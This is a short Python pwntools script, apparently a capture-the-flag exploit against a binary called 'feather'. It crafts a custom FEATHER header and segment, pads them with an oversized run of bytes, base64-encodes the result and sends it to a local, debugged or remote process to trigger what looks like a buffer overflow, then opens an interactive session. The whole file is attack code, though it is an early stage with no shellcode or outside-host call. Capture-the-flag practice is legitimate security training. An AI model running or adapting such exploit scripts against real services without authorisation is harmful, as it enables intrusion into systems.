#!/usr/bin/env python3

from pwn import *
from base64 import b64encode


_FILE = "./feather"
binary = context.binary = ELF(_FILE, checksec=False)

env = {"LD_PRELOAD": "./libc-2.31.so"}

if args.REMOTE:
    _LIBC = ELF("./libc-2.31.so")
    p = remote()
elif args.GDB:
    _LIBC = binary.libc
    p = gdb.debug(binary.path, gdbscript="\nc\n")
else:
    p = process(binary.path)



def get_header(seg: int):
    magic = b"FEATHER".ljust(8, b"\x00")
    num_segments = p32(seg)
    return magic + num_segments

def get_segment(t: int, i: int, o: int, l: int):
    Type = p32(t)
    Id = p32(i)
    offset = p32(o)
    length = p32(l)
    return Type + Id + offset + length

## interactive functions ##

def send_feather(b: bytes):
    p.recvuntil("newlines:\n")
    p.sendline(b)
    p.sendline()
    return p.clean().decode("latin-1")

header = get_header(10)

segment = get_segment(1, 0, 4, 4)



extra = b"B"*8
content = b"A"*(ord("Z")*16) + extra

payload = header + segment + content
payload = b64encode(payload)

print(send_feather(payload))

p.interactive()
